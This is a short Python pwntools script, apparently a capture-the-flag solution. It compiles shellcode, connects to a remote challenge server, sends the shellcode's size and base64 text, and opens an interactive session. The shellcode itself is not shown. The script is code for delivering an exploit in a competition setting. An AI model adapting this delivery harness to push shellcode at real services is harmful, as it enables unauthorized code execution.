#!/usr/bin/env python3
from pwn import *
subprocess.check_call(['make'])
with open('shellcode', 'rb') as fp:
    shellcode = fp.read()
io = remote('biooosless.challenges.ooo', 6543)
io.recvuntil(b'Give me your shellcode size in hex (valid range: [0, 0x800]). Example: "0x100"\r\n')
io.recvuntil(b'> ')
io.sendline(hex(len(shellcode)))
io.recvuntil(b'Give me your shellcode in base64 (in one line)\r\n')
io.recvuntil(b'> ')
io.sendline(base64.b64encode(shellcode))
io.interactive()
